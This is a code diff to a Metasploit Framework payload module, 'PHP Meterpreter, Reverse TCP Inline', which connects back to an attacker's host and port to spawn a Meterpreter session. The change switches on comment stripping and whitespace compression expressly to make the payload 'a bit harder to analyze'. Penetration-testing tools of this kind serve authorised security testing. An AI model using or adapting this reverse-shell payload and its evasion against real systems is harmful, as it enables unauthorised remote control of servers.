@@ -1,8 +1,4 @@
 ##
-# $Id$
-##
-
-##
 # This file is part of the Metasploit Framework and may be subject to
 # redistribution and commercial restrictions. Please see the Metasploit
 # web site for more information on licensing and terms of use.
@@ -22,7 +18,6 @@ module Metasploit3
 	def initialize(info = {})
 		super(update_info(info,
 			'Name'          => 'PHP Meterpreter, Reverse TCP Inline',
-			'Version'       => '$Revision$',
 			'Description'   => 'Connect back to attacker and spawn a Meterpreter server (PHP)',
 			'Author'        => ['egypt'],
 			'Platform'      => 'php',
@@ -38,11 +33,12 @@ module Metasploit3
 			f.read(f.stat.size)
 		}
 		met.gsub!("127.0.0.1", datastore['LHOST']) if datastore['LHOST']
-		met.gsub!("4444", datastore['LPORT']) if datastore['LPORT']
-		# XXX When this payload is more stable, remove comments and compress
-		# whitespace to make it smaller and a bit harder to analyze
-		#met.gsub!(/#.*$/, '')
-		#met = Rex::Text.compress(met)
+		met.gsub!("4444", datastore['LPORT'].to_s) if datastore['LPORT']
+
+		# remove comments and compress whitespace to make it smaller and a
+		# bit harder to analyze
+		met.gsub!(/#.*$/, '')
+		met = Rex::Text.compress(met)
 		met
 	end
 end
